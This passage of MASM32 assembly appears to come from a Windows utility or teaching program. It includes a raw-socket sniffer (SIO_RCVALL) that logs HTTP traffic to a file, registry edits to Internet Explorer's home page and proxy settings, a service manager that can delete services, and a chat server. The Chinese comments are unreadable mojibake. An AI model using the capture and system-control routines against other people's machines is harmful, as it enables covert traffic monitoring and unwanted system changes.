
            invoke htons,dwHttpFilterBindingPort
            mov @addrLocal.sin_port,ax
            mov @addrLocal.sin_family,AF_INET
            mov eax,@dwSourceIP
            mov @addrLocal.sin_addr.S_un.S_addr,eax

            invoke bind,hRecvSocket,addr @addrLocal,sizeof sockaddr_in ;�� sockRaw �󶨵�����������
            .if eax==SOCKET_ERROR
                invoke WSAGetLastError
                invoke wsprintf,addr szBuffer,addr szOut,eax
                invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif

            invoke ioctlsocket,hRecvSocket,SIO_RCVALL,addr @dwValue  ;�� sockRaw �������е�����
            .if eax
                invoke WSAGetLastError
                invoke wsprintf,addr szBuffer,addr szOut,eax
                invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
            .endif

            ;��ʼ����д���ݰ�ʹ�õı���
            mov dwDealedPackets,0
            mov dwReceivePackets,0
            mov eax,lpMaxBuffer     ;��������ʼλ��
            mov lpBufferWrite,eax   ;д������ָ��
            mov lpBufferRead,eax    ;��������ָ��
            add eax,MAX_BUFFER_SIZE
            add lpMaxEndBuffer,eax  ;����������λ��

            ;���ڴ�д���ļ��Թ����
            invoke CreateFile,addr lpHttpFilterFileName,GENERIC_WRITE,\
                   FILE_SHARE_READ,\
                   0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
            mov hHttpFilterFile,eax

            ;�����������ݰ�����
            invoke CreateThread,NULL,0,offset _httpFilterDeal,_dwParam,\
                   NULL,addr @dwThreadID
            invoke CloseHandle,eax

            ;�����������ݰ�����
            mov bStopRecvPacket,0
            invoke CreateThread,NULL,0,offset _httpFilterReceive,_dwParam,\
                   NULL,addr @dwThreadID
            invoke CloseHandle,eax
            ret
_httpFilter   endp



;----------------------------
; ע���IE����ѡ��Ի���
;----------------------------
_RegIEDlgProc  proc uses edi hRegIEWnd:dword,uMsg:dword,\
                wParam:dword,lParam:dword
         local @dwSize,@dwType,@hKey,@hSCManager
         local @szValue[256]:byte
         local @bytesNeeded,@dwServicesCount
         local @hFile,@dwTemp,@dwTemp1
         local @hKey1
         local @port[10]:byte
         local @ip[30]:byte

         .if uMsg==WM_NOTIFY   ;"Ӧ�ð�ť������"
           mov edi,lParam
           assume edi:ptr PSHNOTIFY
           .if [edi].hdr.code==PSN_APPLY

           .endif
         .elseif uMsg==WM_INITDIALOG  ;�Ի����ʼ��
           invoke SendDlgItemMessage,hRegIEWnd,IDC_IEADDR,\
                  EM_LIMITTEXT,512,NULL

           ;��ע����л�ȡ��ǰ��ҳ��ַ
           invoke RtlZeroMemory,addr szBuffer,512
           invoke RegOpenKeyEx,HKEY_CURRENT_USER,addr lpszMainPageKey,NULL,\
                  KEY_QUERY_VALUE,addr @hKey
           .if eax==ERROR_SUCCESS
              invoke RegQueryValueEx,@hKey,addr lpszMainPageName,NULL,\
                     addr @dwType,addr szBuffer,addr @dwSize
              invoke SetDlgItemText,hRegIEWnd,IDC_IEADDR,\
                     addr szBuffer
           .else
              invoke SetDlgItemText,hRegIEWnd,IDC_IEADDR,\
                     addr lpszAddr
           .endif

           ;��ʾĬ��IP��ַ
           mov esi,0
           mov edi,0
           .while TRUE
             mov al ,byte ptr [lpszProxyServerV+esi]
             .break .if al==3ah
             mov byte ptr [@szValue+edi],al
             inc esi
             inc edi
           .endw
           inc esi
           mov byte ptr [@szValue+edi],0
           push esi
           invoke SetDlgItemText,hRegIEWnd,IDC_PROXYIP,\
                  addr @szValue
           ;��ʾĬ�϶˿ں�
           pop esi
           mov edi,0
           .while TRUE
             mov al ,byte ptr [lpszProxyServerV+esi]
             .break .if al==0
             mov byte ptr [@szValue+edi],al
             inc esi
             inc edi
           .endw
           mov byte ptr [@szValue+edi],0
           invoke SetDlgItemText,hRegIEWnd,IDC_PROXYPORT,\
                  addr @szValue

           ;��ʼ����ѡ��
           ;��ҳ��ַʹ��
           invoke RegOpenKeyEx,HKEY_CURRENT_USER,addr lpszDisIEAddrKey,NULL,\
               KEY_QUERY_VALUE,addr @hKey
           .if eax==ERROR_SUCCESS
              invoke RegQueryValueEx,@hKey,addr lpszDisIEAddrName,NULL,\
                  addr @dwType,addr @szValue,addr @dwSize
              invoke RegCloseKey,@hKey
           .endif
           .if dword ptr @szValue==1
               invoke CheckDlgButton,hRegIEWnd,IDC_DISABLEIEADDR,BST_CHECKED
               mov dwDisIEAddr,1
           .else
               invoke CheckDlgButton,hRegIEWnd,IDC_DISABLEIEADDR,BST_UNCHECKED
               mov dwDisIEAddr,0
           .endif

           mov @szValue,0
           ;�û���������ʹ��
           invoke RegOpenKeyEx,HKEY_CURRENT_USER,addr lpszDisProxyKey,NULL,\
               KEY_QUERY_VALUE,addr @hKey
           .if eax==ERROR_SUCCESS
              invoke RegQueryValueEx,@hKey,addr lpszDisProxyName,NULL,\
                  addr @dwType,addr @szValue,addr @dwSize
              invoke RegCloseKey,@hKey
           .endif
           .if dword ptr @szValue==1
               invoke CheckDlgButton,hRegIEWnd,IDC_DISABLEPROXY,BST_CHECKED
               mov dwDisProxy,1
           .else
               invoke CheckDlgButton,hRegIEWnd,IDC_DISABLEPROXY,BST_UNCHECKED
               mov dwDisProxy,0
           .endif

           mov @szValue,0
           ;�Ƿ��Ѿ����ڴ�������
           invoke RegOpenKeyEx,HKEY_CURRENT_USER,addr lpszDisProxySetKey,NULL,\
               KEY_QUERY_VALUE,addr @hKey
           .if eax==ERROR_SUCCESS
              invoke RegQueryValueEx,@hKey,addr lpszDisProxySetName,NULL,\
                  addr @dwType,addr @szValue,addr @dwSize
              invoke RegCloseKey,@hKey
           .endif
           .if dword ptr @szValue==1
               invoke CheckDlgButton,hRegIEWnd,IDC_USEPROXY,BST_CHECKED
               mov dwDisProxySet,1
               invoke _getProxyServerInfo,hRegIEWnd
               invoke _EnableProxyOptions,hRegIEWnd,TRUE
           .else
               invoke CheckDlgButton,hRegIEWnd,IDC_USEPROXY,BST_UNCHECKED
               mov dwDisProxySet,0
               invoke _EnableProxyOptions,hRegIEWnd,FALSE
           .endif

         .elseif uMsg==WM_COMMAND
            mov eax,wParam
             .if ax==IDC_SETIEADDR      ;��������IE�������ҳ��ַ
                invoke RtlZeroMemory,addr szBuffer,512
                invoke GetDlgItemText,hRegIEWnd,IDC_IEADDR,\
                       addr szBuffer,sizeof szBuffer
                invoke _RegSetMainPage,addr szBuffer,addr lpszMainPageKey,\
                       addr lpszMainPageName,sizeof szBuffer
                invoke RtlZeroMemory,addr szBuffer,512
             .elseif ax==IDC_DISABLEIEADDR  ;��ֹ������ҳ��ַ
                test  dwDisIEAddr,F_CONSOLE
                .if  ZERO?
                   invoke CheckDlgButton,hRegIEWnd,IDC_DISABLEIEADDR,BST_CHECKED
                   invoke _RegDisableAddr,addr lpszDisIEAddrKey,addr lpszDisIEAddrName,FALSE
                .else
                   invoke CheckDlgButton,hRegIEWnd,IDC_DISABLEIEADDR,BST_UNCHECKED
                   invoke _RegDisableAddr,addr lpszDisIEAddrKey,addr lpszDisIEAddrName,TRUE
                .endif  
                not   dwDisIEAddr
             .elseif ax==IDC_DISABLEPROXY  ;��ֹ���Ĵ����������
                test  dwDisProxy,F_CONSOLE
                .if  ZERO?
                   invoke CheckDlgButton,hRegIEWnd,IDC_DISABLEPROXY,BST_CHECKED
                   invoke _RegDisableProxy,addr lpszDisProxyKey,addr lpszDisProxyName,FALSE
                .else
                   invoke CheckDlgButton,hRegIEWnd,IDC_DISABLEPROXY,BST_UNCHECKED
                   invoke _RegDisableProxy,addr lpszDisProxyKey,addr lpszDisProxyName,TRUE
                .endif  
                not   dwDisProxy
             .elseif ax==IDC_USEPROXY  ;���ô��������
                test  dwDisProxySet,F_CONSOLE
                .if  ZERO?
                   invoke _EnableProxyOptions,hRegIEWnd,TRUE
                   invoke CheckDlgButton,hRegIEWnd,IDC_USEPROXY,BST_CHECKED
                   invoke _RegDisableProxy,addr lpszDisProxySetKey,addr lpszDisProxySetName,FALSE
                .else
                   invoke _EnableProxyOptions,hRegIEWnd,FALSE
                   invoke CheckDlgButton,hRegIEWnd,IDC_USEPROXY,BST_UNCHECKED
                   invoke _RegDisableProxy,addr lpszDisProxySetKey,addr lpszDisProxySetName,TRUE
                .endif  
                not   dwDisProxySet
             .elseif ax==IDC_SETPROXY ;���ô��������ֵ
                invoke RegCreateKey,HKEY_CURRENT_USER,addr lpszDisProxySetKey,addr @hKey
                .if eax==ERROR_SUCCESS
                   invoke RegSetValueEx,@hKey,addr lpszDisProxySetName,NULL,\
                         REG_DWORD,addr lpszDisProxySetV,4
                   invoke RegSetValueEx,@hKey,addr lpszProxyOverrideN,NULL,\
                         REG_SZ,addr lpszProxyOverrideV,sizeof lpszProxyOverrideV

                   invoke RtlZeroMemory,addr szBuffer,512
                   invoke GetDlgItemText,hRegIEWnd,IDC_PROXYIP,\
                          addr @ip,sizeof @ip
                   invoke GetDlgItemText,hRegIEWnd,IDC_PROXYPORT,\
                          addr @port,sizeof @port
                   invoke wsprintf,addr szBuffer,addr szFmtProxyServer,\
                          addr @ip,addr @port
                   invoke RegSetValueEx,@hKey,addr lpszProxyServerN,NULL,\
                         REG_SZ,addr szBuffer,sizeof szBuffer
                   invoke RegCloseKey,@hKey
                .endif
                invoke RtlZeroMemory,addr szBuffer,512

             .elseif ax==IDC_RESETIE  ;����IE�����Ĭ������
                invoke _httpFilter,hRegIEWnd

                ;����һ����̨����
                ;invoke OpenSCManager,NULL,NULL,SC_MANAGER_ENUMERATE_SERVICE 
                ;mov @hSCManager,eax
                ;invoke CreateService,eax,addr lpszServiceName,addr lpszDisplayName,\
                ;    SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS or SERVICE_INTERACTIVE_PROCESS,\
                ;    SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,addr lpszServicePath,\
                ;    NULL,NULL,NULL,NULL,NULL
                ;invoke CloseServiceHandle,eax
             .endif     
         .elseif uMsg==WM_CLOSE
           invoke DestroyWindow,hRegIEWnd
         .else
           mov eax,FALSE
           ret
         .endif
         mov eax,TRUE  
         ret
_RegIEDlgProc  endp


;----------------------------------
; ö��ϵͳ��̨������ӵ������
;----------------------------------
_EnumServiceItems proc uses ebx ecx
         local @dwSize,@dwType,@hKey,@hSCManager
         local @szValue[256]:byte
         local @bytesNeeded,@dwServicesCount
         local @hFile,@dwTemp,@dwTemp1,@dwIndex
         local @hService,@dwRead
         local @lpQServiceStatus:QUERY_SERVICE_CONFIG 


         invoke _clearServiceView ;��ձ������
         invoke OpenSCManager,NULL,NULL,SC_MANAGER_ENUMERATE_SERVICE 
         mov @hSCManager,eax
         invoke EnumServicesStatus,@hSCManager,SERVICE_WIN32,\
                SERVICE_STATE_ALL,addr lpServicesBuffer,\
                sizeof lpServicesBuffer,addr @bytesNeeded,\
                addr @dwServicesCount,NULL

         mov @dwIndex,0
         mov @dwTemp1,sizeof ENUM_SERVICE_STATUS
         mov @dwSize,offset lpServicesBuffer
         .while TRUE
              mov esi,@dwSize
              assume esi:ptr ENUM_SERVICE_STATUS
              ;�ڱ��������һ��
              invoke _ListViewSetItem,hRegServiceTable,dwCount,-1,[esi].lpServiceName
              mov dwCount,eax
              xor ebx,ebx
              push esi
              invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                    [esi].lpServiceName
              pop esi
              inc ebx
              push esi
              invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                    [esi].lpDisplayName
              pop esi
              inc ebx
              push esi
              mov eax,[esi].ServiceStatus.dwCurrentState
              .if eax==SERVICE_CONTINUE_PENDING
                 invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                        addr lpszServiceStatus1
              .elseif eax==SERVICE_PAUSE_PENDING
                 invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                        addr lpszServiceStatus2
              .elseif eax==SERVICE_PAUSED
                 invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                        addr lpszServiceStatus3
              .elseif eax==SERVICE_RUNNING
                 invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                        addr lpszServiceStatus4
              .elseif eax==SERVICE_START_PENDING
                 invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                        addr lpszServiceStatus5
              .elseif eax==SERVICE_STOP_PENDING
                 invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                        addr lpszServiceStatus6
              .elseif eax==SERVICE_STOPPED
                 invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                        addr lpszServiceStatus7
              .else
                 invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                        addr lpszServiceStatus8
              .endif

              ;����Ѿ������ã�����ȷ����
              push ebx
              invoke OpenSCManager,NULL,NULL,SC_MANAGER_ENUMERATE_SERVICE 
              mov @hSCManager,eax
              invoke OpenService,eax,[esi].lpServiceName,SC_MANAGER_ALL_ACCESS
              mov @hService,eax
              invoke QueryServiceConfig,@hService,addr @lpQServiceStatus,\
                     sizeof @lpQServiceStatus,addr @dwRead
              pop ebx 
              .if @lpQServiceStatus.dwStartType==SERVICE_DISABLED
                   invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                         addr lpszServiceStatus9
              .endif

              pop esi
              inc ebx
              push esi
              invoke _ListViewSetItem,hRegServiceTable,dwCount,ebx,\
                    addr lpszServiceProPath
              pop esi

              inc dwCount
              assume esi:nothing

              fild @dwSize
              fild @dwTemp1
              fadd
              fistp @dwSize

              dec @dwServicesCount
              .break .if @dwServicesCount==0                                      
         .endw                
         ret
_EnumServiceItems endp
;----------------------------
; ע���ϵͳ����ѡ��Ի���
;----------------------------
_RegServiceDlgProc  proc uses ebx edi esi hRegServiceWnd:dword,uMsg:dword,\
                wParam:dword,lParam:dword
         local @lpServiceStatus:SERVICE_STATUS
         local @hService,@hSCManager,@dwRead
         local @lpQServiceStatus:QUERY_SERVICE_CONFIG 



         .if uMsg==WM_NOTIFY   ;"Ӧ�ð�ť������"
            mov eax,lParam
            mov ebx,lParam
            ;���ĸ��ؼ�״̬
            mov eax,[eax+NMHDR.hwndFrom]
            .if eax==hRegServiceTable
                mov ebx,lParam
                .if [ebx+NMHDR.code]==NM_CLICK
                    assume ebx:ptr NMLISTVIEW
                    mov eax,[ebx].iItem
                    mov dwServiceLineIndex,eax

                    invoke RtlZeroMemory,addr szBuffer,sizeof szBuffer
                    invoke _GetListViewItem,hRegServiceTable,dwServiceLineIndex,0,\
                        addr szBuffer
                    invoke OpenSCManager,NULL,NULL,SC_MANAGER_ENUMERATE_SERVICE 
                    mov @hSCManager,eax
                    invoke OpenService,eax,addr szBuffer,SC_MANAGER_ALL_ACCESS
                    mov @hService,eax
                    invoke QueryServiceConfig,@hService,addr @lpQServiceStatus,\
                           sizeof @lpQServiceStatus,addr @dwRead
                    .if @lpQServiceStatus.dwStartType==SERVICE_DISABLED
                       invoke GetDlgItem,hRegServiceWnd,IDC_SERVICESTOP
                       invoke EnableWindow,eax,FALSE
                       invoke GetDlgItem,hRegServiceWnd,IDC_SERVICERUN
                       invoke EnableWindow,eax,FALSE
                       jmp @next
                    .endif

                    invoke RtlZeroMemory,addr szBuffer,sizeof szBuffer
                    invoke _GetListViewItem,hRegServiceTable,dwServiceLineIndex,2,\
                        addr szBuffer
                    mov al,byte ptr [szBuffer]
                    cmp al,0CDh  ;��ͣ���ֵĵ�һ���ֽ�
                    jz @F
                    ;��������
                    invoke GetDlgItem,hRegServiceWnd,IDC_SERVICESTOP
                    invoke EnableWindow,eax,TRUE
                    invoke GetDlgItem,hRegServiceWnd,IDC_SERVICERUN
                    invoke EnableWindow,eax,FALSE
                    jmp @next
                    @@:
                    ;�����ֹͣ
                    invoke GetDlgItem,hRegServiceWnd,IDC_SERVICESTOP
                    invoke EnableWindow,eax,FALSE
                    invoke GetDlgItem,hRegServiceWnd,IDC_SERVICERUN
                    invoke EnableWindow,eax,TRUE
                   @next:
                .endif
            .endif
         .elseif uMsg==WM_INITDIALOG  ;�Ի����ʼ��
             invoke GetDlgItem,hRegServiceWnd,IDC_SERVICETABLE
             mov hRegServiceTable,eax
             invoke SendMessage,hRegServiceTable,LVM_SETEXTENDEDLISTVIEWSTYLE,\
                    0,LVS_EX_GRIDLINES or LVS_EX_FULLROWSELECT
             invoke ShowWindow,hRegServiceTable,SW_SHOW

             mov dwCount,0
             invoke _EnumServiceItems   ;��ʾϵͳ������Ŀ

             invoke EnableWindow,hApplyButton,TRUE
         .elseif uMsg==WM_COMMAND
            mov eax,wParam
             .if ax==IDC_SERVICERESH      ;ˢ��
                 invoke _EnumServiceItems
             .elseif ax==IDC_SERVICERUN   ;����
                 invoke RtlZeroMemory,addr szBuffer,sizeof szBuffer
                 invoke _GetListViewItem,hRegServiceTable,dwServiceLineIndex,0,\
                       addr szBuffer
                 invoke OpenSCManager,NULL,NULL,SC_MANAGER_ENUMERATE_SERVICE 
                 mov @hSCManager,eax
                 invoke OpenService,@hSCManager,addr szBuffer,SC_MANAGER_ALL_ACCESS
                 mov @hService,eax
                 invoke StartService,@hService,NULL,NULL
                 invoke _EnumServiceItems
             .elseif ax==IDC_SERVICESTOP  ;ֹͣ
                 invoke RtlZeroMemory,addr szBuffer,sizeof szBuffer
                 invoke _GetListViewItem,hRegServiceTable,dwServiceLineIndex,0,\
                       addr szBuffer
                 invoke OpenSCManager,NULL,NULL,SC_MANAGER_ENUMERATE_SERVICE 
                 mov @hSCManager,eax
                 invoke OpenService,eax,addr szBuffer,SC_MANAGER_ALL_ACCESS
                 mov @hService,eax
                 invoke ControlService,@hService,SERVICE_CONTROL_STOP,addr @lpServiceStatus
                 invoke _EnumServiceItems
             .elseif ax==IDC_SERVICEDEL   ;ɾ����̨����
                 invoke RtlZeroMemory,addr szBuffer,sizeof szBuffer
                 invoke _GetListViewItem,hRegServiceTable,dwServiceLineIndex,0,\
                       addr szBuffer
                 invoke OpenSCManager,NULL,NULL,SC_MANAGER_ENUMERATE_SERVICE 
                 mov @hSCManager,eax
                 invoke OpenService,eax,addr szBuffer,SC_MANAGER_ALL_ACCESS
                 mov @hService,eax
                 invoke DeleteService,@hService
                 invoke CloseServiceHandle,@hService
                 invoke _EnumServiceItems
             .endif
         .elseif uMsg==WM_CLOSE
           invoke DestroyWindow,hRegServiceWnd
         .else
           mov eax,FALSE
           ret
         .endif
         mov eax,TRUE  
         ret
_RegServiceDlgProc  endp

;------------------------
; �������׽���
; �������Ϊ���������ھ��
;------------------------
_initChatServer   proc _dwPara
            local @stWsa:WSADATA
            local @stSin:sockaddr_in
     
            invoke WSAStartup,0101h,addr @stWsa
            invoke socket,AF_INET,SOCK_STREAM,0
            mov hSocket,eax
            invoke WSAAsyncSelect,hSocket,_dwPara,WM_SOCKET,FD_ACCEPT

            invoke RtlZeroMemory,addr @stSin,sizeof @stSin
            invoke htons,CHAT_TCP_PORT
            mov @stSin.sin_port,ax
            mov @stSin.sin_family,AF_INET
            mov @stSin.sin_addr,INADDR_ANY
            invoke bind,hSocket,addr @stSin,sizeof @stSin
            .if eax==SOCKET_ERROR
                invoke MessageBox,_dwPara,addr szOut8,NULL,MB_OK
                invoke SendMessage,_dwPara,WM_CLOSE,0,0
            .else
                invoke listen,hSocket,5   ;������г��ȣ�����ٶȹ��죬����Ϊ1�Ϳ�����
            .endif
            ret
_initChatServer   endp
_clearChatServerView  proc uses ebx ecx
            invoke _ListViewClear,hChatServerTable
            ;��ӱ�ͷ
            mov ebx,1
            mov eax,50
            lea ecx,szChatColName1

            invoke _ListViewAddColumn,hChatServerTable,ebx,eax,ecx

            mov ebx,2
            mov eax,150
            lea ecx,szChatColName2
            invoke _ListViewAddColumn,hChatServerTable,ebx,eax,ecx

            mov ebx,3
            mov eax,50
            lea ecx,szChatColName3
            invoke _ListViewAddColumn,hChatServerTable,ebx,eax,ecx

            mov ebx,4
            mov eax,50
            lea ecx,szChatColName4

            invoke _ListViewAddColumn,hChatServerTable,ebx,eax,ecx

            mov ebx,5
            mov eax,100
            lea ecx,szChatColName5
            invoke _ListViewAddColumn,hChatServerTable,ebx,eax,ecx

            mov ebx,6
            mov eax,160
            lea ecx,szChatColName6
            invoke _ListViewAddColumn,hChatServerTable,ebx,eax,ecx

            mov dwCount,0
            ret
_clearChatServerView  endp


_refreshChatServer proc _dwPara
               local @dwCount,@dwCount1
               local @dwLen
               local @szBuffer[40]:byte

               invoke _clearChatServerView

               invoke RtlZeroMemory,addr @szBuffer,40
               invoke SendDlgItemMessage,_dwPara,\
                      IDC_CHATOBJECT,CB_GETLBTEXT,dwCurrentSelUser,addr @szBuffer
               invoke SendDlgItemMessage,_dwPara,\
                      IDC_CHATOBJECT,CB_RESETCONTENT,0,0
               invoke SendDlgItemMessage,_dwPara,\   ;��Ӵ��ѡ��
                       IDC_CHATOBJECT,CB_ADDSTRING,0,addr lpszToAll


               ;������ʾ��¼�û��б�
               mov @dwLen,sizeof USERINFO
               mov @dwCount,0
               mov dwCurrentSelUser,0
               mov esi,offset lChatUsers
               assume esi:ptr USERINFO

               ;���û���Ϣȡ���ŵ������
               .while @dwCount<MAX_SOCKET
                     mov eax,[esi].hSocket
                     .if eax!=0
                        ;����Ϣ��ӵ��û������
                        invoke _ListViewSetItem,hChatServerTable,dwCount,-1,0
                        mov dwCount,eax
                        xor ebx,ebx
                        
                        ;���
                        mov eax,[esi].hSocket
                        invoke wsprintf,addr szBuffer,addr szOut,eax
                        invoke _ListViewSetItem,hChatServerTable,dwCount,ebx,\
                              addr szBuffer
                        ;����
                        inc ebx
                        invoke _ListViewSetItem,hChatServerTable,dwCount,ebx,\
                              addr [esi].userName
                        invoke SendDlgItemMessage,_dwPara,\
                               IDC_CHATOBJECT,CB_ADDSTRING,0,addr [esi].userName
                        inc dwCurrentSelUser
                        ;�Ա�
                        inc ebx
                        mov al,[esi].sex
                        .if al==0 ;Ů
                          invoke _ListViewSetItem,hChatServerTable,dwCount,ebx,\
                              addr lpszSexB
                        .else
                          invoke _ListViewSetItem,hChatServerTable,dwCount,ebx,\
                              addr lpszSexA
                        .endif
                        ;״̬
                        inc ebx
                        invoke _ListViewSetItem,hChatServerTable,dwCount,ebx,\
                              addr [esi].status
                        ;IP��ַ                         
                        inc ebx
                        invoke _ListViewSetItem,hChatServerTable,dwCount,ebx,\
                              addr [esi].ip
                        ;����ʱ��                         
                        inc ebx
                        invoke _ListViewSetItem,hChatServerTable,dwCount,ebx,\
                              addr [esi].loginTime
                        inc dwCount     
                     .endif
                     inc @dwCount
                     add esi,@dwLen
             .endw
             assume esi:nothing 

             ;��ʾ�������û�������ط��Ǵ���ģ�����
             dec dwCurrentSelUser
             invoke SendDlgItemMessage,_dwPara,\
                         IDC_CHATOBJECT,CB_SETCURSEL,dwCurrentSelUser,0

             invoke SetDlgItemInt,_dwPara,IDC_TOTALUSERS,dwTotalUsers,FALSE
             ret
_refreshChatServer endp
            
;-----------------------------
; ��ӿͻ���������
; �����õ���stDestAddr���ݽṹ
; ����0��ʾ��ӳɹ���
; 1��ʾ��IP�Ѿ����⣬����������
; 2��ʾ��������������
; 3��ʾ�����Ѿ���ռ��
;-----------------------------
_addClient   proc _hDataSock,_dwPara
             local @dwUserSize
             local @dwTemp,@dwTemp1,@dwTemp2
             local @datetime[9]:byte
             local @ipAddr[16]:byte
             local @userName[21]:byte
             local @status[10]:byte
             local @ret
             local @stST:SYSTEMTIME

             mov @ret,0
             mov @dwUserSize,sizeof USERINFO
             invoke WSAAsyncSelect,_hDataSock,_dwPara,\
                    WM_SOCKET,FD_READ or FD_CLOSE
             xor ebx,ebx
             mov esi,offset lChatUsers
             assume esi:ptr USERINFO

             .while ebx<MAX_SOCKET
                  .if ![esi].hSocket  ;��ʾΪSOCKETΪ0������ 
                     ;����Ϣ��ӵ�������
                     push _hDataSock
                     pop [esi].hSocket

                     mov [esi].sex,1
                     
                     invoke wsprintf,addr @userName,addr szChatServerFmt,\
                                    _hDataSock
                     invoke lstrcpy,addr [esi].userName,addr @userName

                     invoke inet_ntoa,stDestAddr.sin_addr.S_un.S_addr
                     invoke lstrcpy,addr [esi].ip,eax

                     invoke lstrcpy,addr [esi].status,addr normal_Status

                     ;��ȡʱ��
                     invoke RtlZeroMemory,addr @datetime,9
                     invoke GetLocalTime,addr @stST
                     movzx eax,@stST.wHour
                     movzx ebx,@stST.wMinute
                     movzx ecx,@stST.wSecond
                     invoke wsprintf,addr @datetime,addr szFormat0,\
                            eax,ebx,ecx
                     invoke lstrcpy,addr [esi].loginTime,addr @datetime


                     inc dwTotalUsers

                     ;���û���ӵ������б��Ա����Ա���Կ�����Ի�����
                     xor edx,edx
                     mov edi,offset lFilterUsers
                     .while edx<MAX_SOCKET
                        .if ! dword ptr [edi]
                          push _hDataSock
                          pop [edi]
                          .break
                        .endif
                        inc edx
                        add edi,4
                     .endw
                     mov eax,0
                     ret            
                .endif
                add esi,@dwUserSize         
                inc ebx
             .endw
             assume esi:nothing

             mov eax,@ret
             ret
_addClient   endp

;-----------------------------
; ���ͻ��ӻ�������ȥ��
; ����0��ʾ��ӳɹ���
;-----------------------------
_removeClient   proc _hDataSock,_dwPara
             local @dwUserSize
             local @dwTemp,@dwTemp1,@dwTemp2
             local @datetime[9]:byte
             local @ipAddr[16]:byte
             local @userName[21]:byte
             local @status[10]:byte
             local @ret,@dwCount
             local @stST:SYSTEMTIME

             mov @ret,0
             mov @dwUserSize,sizeof USERINFO

             mov @dwCount,0
             mov esi,offset lChatUsers
             assume esi:ptr USERINFO

             .while @dwCount<MAX_SOCKET
                  mov eax,_hDataSock
                  .if [esi].hSocket==eax
                     mov [esi].hSocket,0
                     dec dwTotalUsers
                     invoke lstrcpy,addr @userName,addr [esi].userName
                     
                     ;���û��������б���ɾ��
                     xor edx,edx
                     mov edi,offset lFilterUsers
                     .while edx<MAX_SOCKET
                        mov eax,_hDataSock
                        .if dword ptr [edi]==eax
                          mov dword ptr [edi],0
                        .endif
                        inc edx
                        add edi,4
                     .endw


                     xor edx,edx
                     mov edi,offset lMuteUsers
                     .while edx<MAX_SOCKET
                        mov eax,_hDataSock
                        .if dword ptr [edi]==eax
                          mov dword ptr [edi],0
                        .endif
                        inc edx
                        add edi,4
                     .endw


                     xor edx,edx
                     mov edi,offset lMicUsers
                     .while edx<MAX_SOCKET
                        mov eax,_hDataSock
                        .if dword ptr [edi]==eax
                          mov dword ptr [edi],0
                        .endif
                        inc edx
                        add edi,4
                     .endw
                     ;����ϵͳ��ʾ
                     invoke _refreshChatServer,_dwPara
                     mov eax,0
                  .endif
                add esi,@dwUserSize         
                inc @dwCount
             .endw

             mov @dwCount,0
             mov esi,offset lChatUsers
             .while @dwCount<MAX_SOCKET
                .if [esi].hSocket!=0
                  ;�������û������û��뿪����Ϣ
                  invoke RtlZeroMemory,addr bufDisplay,2000
                  invoke lstrcat,addr bufDisplay,addr @userName
                  invoke lstrcat,addr bufDisplay,addr QuitMark
                  invoke lstrlen,addr bufDisplay
                  push esi
                  invoke send,[esi].hSocket,addr bufDisplay,eax,0
                  pop esi
                .endif
                add esi,@dwUserSize         
                inc @dwCount
             .endw
             assume esi:nothing

             mov eax,@ret
             ret
_removeClient   endp

_addUserSex   proc _dwSock,_flag
               local @dwCount
               local @dwLen

               mov @dwCount,0
               mov @dwLen,sizeof USERINFO
               mov esi,offset lChatUsers
               assume esi:ptr USERINFO

               ;���ǳ���ӵ����ݽṹ��
               .while @dwCount<MAX_SOCKET
                     mov eax,[esi].hSocket
                     .if eax==_dwSock
                       .if _flag
                          mov [esi].sex,1
                       .else
                          mov [esi].sex,0
                       .endif
                       .break
                     .endif
                     inc @dwCount
                     add esi,@dwLen
               .endw
               assume esi:nothing 
               ret
_addUserSex   endp

_getTalker     proc _dwSock,_lpszName
               local @dwCount
               local @dwLen

               mov @dwCount,0
               mov @dwLen,sizeof USERINFO
               mov esi,offset lChatUsers
               assume esi:ptr USERINFO

               ;���ǳ���ӵ����ݽṹ��
               .while @dwCount<MAX_SOCKET
                     mov eax,[esi].hSocket
                     .if eax==_dwSock
                       invoke lstrcpy,_lpszName,addr [esi].userName
                       .break
                     .endif
                     add esi,@dwLen
                     inc @dwCount
               .endw
               assume esi:nothing 
               ret
_getTalker     endp
_addNickName   proc _dwSock,_lpszName
               local @dwCount
               local @dwLen

               mov @dwCount,0
               mov @dwLen,sizeof USERINFO
               mov esi,offset lChatUsers
               assume esi:ptr USERINFO

               ;���ǳ���ӵ����ݽṹ��
               .while @dwCount<MAX_SOCKET
                     mov eax,[esi].hSocket
                     .if eax==_dwSock
                       invoke lstrcpy,addr [esi].userName,_lpszName
                       .break
                     .endif
                     add esi,@dwLen
                     inc @dwCount
               .endw
               assume esi:nothing 
               ret
_addNickName   endp
;--------------------
; �ж��û����Ƿ��Ѿ�����
;--------------------
_checkIfUserIsExist proc _lpszName
               local @dwCount
               local @dwSock
               local @dwLen1,@dwLen2
               local @dwLen
               local @Ret

               mov eax,FALSE
               mov @Ret,eax
               mov @dwCount,0
               mov @dwLen,sizeof USERINFO
               mov esi,offset lChatUsers
               assume esi:ptr USERINFO

               ;���ǳ���ӵ����ݽṹ��
               .while @dwCount<MAX_SOCKET
                     mov eax,[esi].hSocket
                     mov @dwSock,eax
                     .if @dwSock!=0
                       push esi
                       invoke lstrcmp,addr [esi].userName,_lpszName
                       pop esi
                       .if !eax
                           mov eax,TRUE
                           mov @Ret,eax
                           .break
                       .endif
                     .endif
                     add esi,@dwLen
                     inc @dwCount
               .endw
               assume esi:nothing 
               mov eax,@Ret
               ret
_checkIfUserIsExist endp
_getSockByNickName  proc _lpszName
               local @dwCount
               local @dwSock
               local @dwLen1,@dwLen2
               local @dwLen
               local @Ret

               mov @dwCount,0
               mov @dwLen,sizeof USERINFO
               mov esi,offset lChatUsers
               assume esi:ptr USERINFO

